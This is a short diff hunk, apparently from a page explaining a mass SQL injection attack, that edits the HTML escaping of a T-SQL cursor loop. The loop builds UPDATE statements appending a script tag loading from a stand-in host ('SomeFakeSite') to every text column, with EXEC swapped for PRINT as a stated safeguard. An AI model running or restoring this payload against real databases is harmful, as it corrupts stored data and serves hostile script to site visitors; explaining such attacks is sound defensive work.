@@ -59,7 +59,7 @@ OPEN Table_Cursor
 	WHILE(@@FETCH_STATUS=0) 
 	BEGIN 
 --I changed EXEC to PRINT, just in case you are foolish enough to run this
-		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;''') 
+		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<script src=http://SomeFakeSite&gt;</script&gt;''') 
 		FETCH NEXT FROM Table_Cursor INTO @T,@C 
 	END 
 CLOSE Table_Cursor DEALLOCATE Table_Cursor </pre>
